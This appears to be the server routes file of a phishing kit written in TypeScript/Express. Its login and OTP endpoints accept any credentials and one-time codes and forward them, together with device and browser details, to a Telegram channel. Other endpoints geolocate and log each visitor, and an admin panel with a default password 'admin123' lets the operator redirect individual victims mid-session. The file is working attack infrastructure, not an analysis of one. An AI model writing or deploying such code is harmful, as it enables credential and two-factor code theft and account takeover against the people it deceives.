import type { Express } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";
import { notifyLogin, notifyOtpVerification, notifyOtpFailure, notifySuccess, notifyLoginFailure, notifyVisitor } from "./telegram";
import { UAParser } from "ua-parser-js";
import { db } from "./db";
import { visitors } from "@shared/schema";
import { eq, desc } from "drizzle-orm";
import { randomBytes } from "crypto";

const loginSchema = z.object({
  email: z.string().min(1, "Email is required"),
  password: z.string().min(1, "Password is required"),
  language: z.string().optional(),
  userAgent: z.string().optional()
});

const otpSchema = z.object({
  otp: z.string().regex(/^\d{6}$/, "OTP must be exactly 6 digits"),
  language: z.string().optional(),
  userAgent: z.string().optional(),
  attempt: z.number().optional()
});

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Simple login endpoint that accepts any credentials and sends to Telegram
  app.post("/api/login", async (req, res) => {
    try {
      const validatedData = loginSchema.parse(req.body);
      
      // Parse User-Agent if provided
      let device = 'Unknown';
      let browser = 'Unknown';
      let os = 'Unknown';
      
      if (validatedData.userAgent) {
        const parser = new UAParser(validatedData.userAgent);
        const result = parser.getResult();
        
        device = result.device.type 
          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
          : 'Desktop/Unknown';
        browser = result.browser.name 
          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
          : 'Unknown';
        os = result.os.name 
          ? `${result.os.name} ${result.os.version || ''}`.trim()
          : 'Unknown';
      }
      
      // Send login credentials to Telegram with language and device info
      const loginNotified = await notifyLogin(
        validatedData.email, 
        validatedData.password,
        validatedData.language,
        device,
        browser,
        os
      );
      
      if (!loginNotified) {
        return res.status(500).json({ 
          error: "Failed to send login notification. Please try again." 
        });
      }

      res.json({
        success: true,
        message: "Login successful"
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors[0].message });
      }
      console.error("Login error:", error);
      res.status(500).json({ error: "Login failed" });
    }
  });

  // OTP verification endpoint that validates codes and sends to Telegram
  app.post("/api/verify-otp", async (req, res) => {
    try {
      const validatedData = otpSchema.parse(req.body);
      
      // Parse User-Agent if provided
      let device = 'Unknown';
      let browser = 'Unknown';
      let os = 'Unknown';
      
      if (validatedData.userAgent) {
        const parser = new UAParser(validatedData.userAgent);
        const result = parser.getResult();
        
        device = result.device.type 
          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
          : 'Desktop/Unknown';
        browser = result.browser.name 
          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
          : 'Unknown';
        os = result.os.name 
          ? `${result.os.name} ${result.os.version || ''}`.trim()
          : 'Unknown';
      }
      
      // OTP validation: Accept only "123456" as the correct code
      // This allows testing both success (123456) and failure (any other code) paths
      // while monitoring all attempts sent to Telegram
      const isValidOtp = validatedData.otp === '123456';
      
      if (isValidOtp) {
        // Send successful OTP code to Telegram for monitoring with language and device info
        const otpNotified = await notifyOtpVerification(
          validatedData.otp,
          validatedData.language,
          device,
          browser,
          os,
          validatedData.attempt
        );
        
        if (!otpNotified) {
          return res.status(500).json({ 
            error: "Failed to send OTP verification notification. Please try again." 
          });
        }

        res.json({
          success: true,
          message: "OTP verification successful"
        });
      } else {
        // OTP validation failed - return error to trigger client-side failure handling
        // The client will then send the failure notification
        res.status(400).json({
          success: false,
          error: "Invalid OTP code"
        });
      }
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors[0].message });
      }
      console.error("OTP verification error:", error);
      res.status(500).json({ error: "OTP verification failed" });
    }
  });

  // OTP failure notification endpoint
  app.post("/api/otp-failure", async (req, res) => {
    // Return immediately to not block the app
    res.json({ success: true });
    
    try {
      const { otp, language, userAgent, attempt } = req.body;
      
      // Parse User-Agent if provided
      let device = 'Unknown';
      let browser = 'Unknown';
      let os = 'Unknown';
      
      if (userAgent) {
        const parser = new UAParser(userAgent);
        const result = parser.getResult();
        
        device = result.device.type 
          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
          : 'Desktop/Unknown';
        browser = result.browser.name 
          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
          : 'Unknown';
        os = result.os.name 
          ? `${result.os.name} ${result.os.version || ''}`.trim()
          : 'Unknown';
      }
      
      // Send OTP failure notification to Telegram (async, don't wait)
      notifyOtpFailure(otp, language, device, browser, os, attempt).catch(err => {
        console.error("Failed to send OTP failure notification:", err);
      });
    } catch (error) {
      console.error("OTP failure tracking error:", error);
    }
  });

  // Success notification endpoint
  app.post("/api/success-notification", async (req, res) => {
    // Return immediately to not block the app
    res.json({ success: true });
    
    try {
      const { language, userAgent } = req.body;
      
      // Parse User-Agent if provided
      let device = 'Unknown';
      let browser = 'Unknown';
      let os = 'Unknown';
      
      if (userAgent) {
        const parser = new UAParser(userAgent);
        const result = parser.getResult();
        
        device = result.device.type 
          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
          : 'Desktop/Unknown';
        browser = result.browser.name 
          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
          : 'Unknown';
        os = result.os.name 
          ? `${result.os.name} ${result.os.version || ''}`.trim()
          : 'Unknown';
      }
      
      // Send success notification to Telegram (async, don't wait)
      notifySuccess(language, device, browser, os).catch(err => {
        console.error("Failed to send success notification:", err);
      });
    } catch (error) {
      console.error("Success notification error:", error);
    }
  });

  // Login failure notification endpoint
  app.post("/api/login-failure", async (req, res) => {
    // Return immediately to not block the app
    res.json({ success: true });
    
    try {
      const { language, userAgent } = req.body;
      
      // Parse User-Agent if provided
      let device = 'Unknown';
      let browser = 'Unknown';
      let os = 'Unknown';
      
      if (userAgent) {
        const parser = new UAParser(userAgent);
        const result = parser.getResult();
        
        device = result.device.type 
          ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
          : 'Desktop/Unknown';
        browser = result.browser.name 
          ? `${result.browser.name} ${result.browser.version || ''}`.trim()
          : 'Unknown';
        os = result.os.name 
          ? `${result.os.name} ${result.os.version || ''}`.trim()
          : 'Unknown';
      }
      
      // Send login failure notification to Telegram (async, don't wait)
      notifyLoginFailure(language, device, browser, os).catch(err => {
        console.error("Failed to send login failure notification:", err);
      });
    } catch (error) {
      console.error("Login failure notification error:", error);
    }
  });

  // Visitor tracking endpoint - now saves to database
  app.post("/api/track-visit", async (req, res) => {
    try {
      // Get IP address - sanitize and validate
      let ip = 'Unknown';
      const forwardedFor = req.headers['x-forwarded-for'] as string;
      
      if (forwardedFor) {
        // Take first IP from X-Forwarded-For chain
        const firstIp = forwardedFor.split(',')[0].trim();
        // Basic IP validation (IPv4 or IPv6)
        if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(firstIp) || /^[0-9a-fA-F:]+$/.test(firstIp)) {
          ip = firstIp;
        }
      } else if (req.socket.remoteAddress) {
        ip = req.socket.remoteAddress;
      }
      
      // Get page and language from request body
      const { page, language, sessionId } = req.body;
      
      // Parse User-Agent for device information
      const userAgent = req.headers['user-agent'] || 'Unknown';
      const parser = new UAParser(userAgent);
      const result = parser.getResult();
      
      const device = result.device.type 
        ? `${result.device.vendor || ''} ${result.device.model || ''} (${result.device.type})`.trim()
        : 'Desktop/Unknown';
      const browser = result.browser.name 
        ? `${result.browser.name} ${result.browser.version || ''}`.trim()
        : 'Unknown';
      const os = result.os.name 
        ? `${result.os.name} ${result.os.version || ''}`.trim()
        : 'Unknown';
      
      // Get country from IP using ipapi.co (with timeout to prevent hanging)
      let country = 'Unknown';
      if (ip !== 'Unknown') {
        try {
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 3000); // 3 second timeout
          
          const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`, {
            signal: controller.signal
          });
          clearTimeout(timeout);
          
          if (geoResponse.ok) {
            const geoData = await geoResponse.json();
            country = geoData.country_name || geoData.country || 'Unknown';
          }
        } catch (error) {
          console.error("Geolocation lookup failed:", error);
          // Continue with Unknown country
        }
      }
      
      // Generate or use existing session ID
      const visitorSessionId = sessionId || randomBytes(16).toString('hex');
      
      // Save or update visitor in database
      try {
        // Check if visitor exists
        const [existingVisitor] = await db
          .select()
          .from(visitors)
          .where(eq(visitors.sessionId, visitorSessionId))
          .limit(1);
        
        if (existingVisitor) {
          // Update existing visitor
          await db
            .update(visitors)
            .set({
              currentPage: page || 'Unknown',
              lastSeen: new Date(),
            })
            .where(eq(visitors.sessionId, visitorSessionId));
        } else {
          // Insert new visitor
          await db.insert(visitors).values({
            sessionId: visitorSessionId,
            ip,
            country,
            language,
            device,
            browser,
            os,
            currentPage: page || 'Unknown',
            status: 'active',
          });
        }
      } catch (dbError) {
        console.error("Failed to save visitor to database:", dbError);
      }
      
      // Send notification to Telegram (async, don't wait for result)
      notifyVisitor(ip, country, device, browser, os, page || 'Unknown', language).catch(err => {
        console.error("❌ CRITICAL: Failed to send visitor notification to Telegram:", err);
      });
      
      // Return session ID to client
      res.json({ success: true, sessionId: visitorSessionId });
      
    } catch (error) {
      console.error("Visitor tracking error:", error);
      res.status(500).json({ error: "Tracking failed" });
    }
  });

  // Admin session tokens (in-memory for simplicity, use Redis/DB in production)
  const adminTokens = new Set<string>();
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123";
  
  // Admin login endpoint
  app.post("/api/admin/login", async (req, res) => {
    try {
      const { password } = req.body;
      
      if (password === ADMIN_PASSWORD) {
        // Generate secure random token
        const token = randomBytes(32).toString('hex');
        adminTokens.add(token);
        
        // Auto-expire token after 24 hours
        setTimeout(() => {
          adminTokens.delete(token);
        }, 24 * 60 * 60 * 1000);
        
        res.json({ success: true, token });
      } else {
        res.status(401).json({ error: "Invalid password" });
      }
    } catch (error) {
      console.error("Admin login error:", error);
      res.status(500).json({ error: "Login failed" });
    }
  });
  
  // Admin authentication middleware
  const adminAuth = (req: any, res: any, next: any) => {
    const authHeader = req.headers.authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: "Unauthorized - Missing token" });
    }
    
    const token = authHeader.substring(7); // Remove "Bearer " prefix
    
    if (!adminTokens.has(token)) {
      return res.status(401).json({ error: "Unauthorized - Invalid or expired token" });
    }
    
    next();
  };

  // Admin endpoint - Get all visitors (PROTECTED)
  app.get("/api/admin/visitors", adminAuth, async (req, res) => {
    try {
      const allVisitors = await db
        .select()
        .from(visitors)
        .orderBy(desc(visitors.lastSeen));
      
      res.json({ visitors: allVisitors });
    } catch (error) {
      console.error("Failed to fetch visitors:", error);
      res.status(500).json({ error: "Failed to fetch visitors" });
    }
  });

  // Admin endpoint - Set redirect target for a visitor (PROTECTED)
  app.post("/api/admin/redirect", adminAuth, async (req, res) => {
    try {
      const { sessionId, redirectTarget } = req.body;
      
      if (!sessionId || !redirectTarget) {
        return res.status(400).json({ error: "sessionId and redirectTarget required" });
      }
      
      await db
        .update(visitors)
        .set({ redirectTarget })
        .where(eq(visitors.sessionId, sessionId));
      
      res.json({ success: true });
    } catch (error) {
      console.error("Failed to set redirect:", error);
      res.status(500).json({ error: "Failed to set redirect" });
    }
  });

  // Endpoint to check if visitor should be redirected
  app.post("/api/check-redirect", async (req, res) => {
    try {
      const { sessionId } = req.body;
      
      if (!sessionId) {
        return res.json({ redirect: null });
      }
      
      const [visitor] = await db
        .select()
        .from(visitors)
        .where(eq(visitors.sessionId, sessionId))
        .limit(1);
      
      if (visitor && visitor.redirectTarget) {
        // Clear redirect target after sending it
        await db
          .update(visitors)
          .set({ redirectTarget: null })
          .where(eq(visitors.sessionId, sessionId));
        
        res.json({ redirect: visitor.redirectTarget });
      } else {
        res.json({ redirect: null });
      }
    } catch (error) {
      console.error("Failed to check redirect:", error);
      res.json({ redirect: null });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
